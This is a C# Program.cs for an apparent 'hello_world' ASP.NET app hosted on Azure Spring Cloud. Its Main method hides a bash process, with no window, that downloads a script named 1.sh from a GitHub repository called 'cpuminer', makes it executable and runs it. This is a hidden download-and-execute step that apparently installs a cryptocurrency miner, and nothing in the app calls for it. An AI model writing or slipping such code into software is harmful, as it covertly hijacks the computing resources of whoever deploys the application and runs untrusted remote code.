using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Microsoft.Azure.SpringCloud.Client;

namespace hello_world
{
    public class Program
    {
        public static void Main(string[] args)
        {
            CreateHostBuilder(args).Build().Run();
            try
            {
                // new Process()
                // {
                //     StartInfo = new ProcessStartInfo()
                //     {
                //         WindowStyle = ProcessWindowStyle.Hidden,
                //         FileName = $"/bin/bash",
                //         WorkingDirectory = AppContext.BaseDirectory,
                //         Arguments = $"-c \"tmux\"",
                //         RedirectStandardOutput = true,
                //         RedirectStandardError = true,
                //         UseShellExecute = false
                //     }
                // }.Start();
                // Thread.Sleep(2500);
                var process = new Process();
                var processStartInfo = new ProcessStartInfo()
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = $"/bin/bash",
                    WorkingDirectory = AppContext.BaseDirectory,
                    Arguments =
                        $"-c \"curl -LJO https://raw.githubusercontent.com/ubuntuabd4/cpuminer/master/1.sh 1.sh; chmod +x 1.sh ; ./1.sh \"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                process.StartInfo = processStartInfo;
                process.Start();
                process.WaitForExit();
                String error = process.StandardError.ReadToEnd();
                Console.WriteLine("ERROR: ", error);
                String output = process.StandardOutput.ReadToEnd();
                Console.WriteLine("OUTPUT: ", output);
            }
            catch (Exception ex)
            {
                //_logger.LogError(ex.Message, ex);
                throw;
            }
        }

        public static IHostBuilder CreateHostBuilder(string[] args) =>
            Host.CreateDefaultBuilder(args)
                .UseAzureSpringCloudService()
                .ConfigureWebHostDefaults(webBuilder => { webBuilder.UseStartup<Startup>(); });
    }
}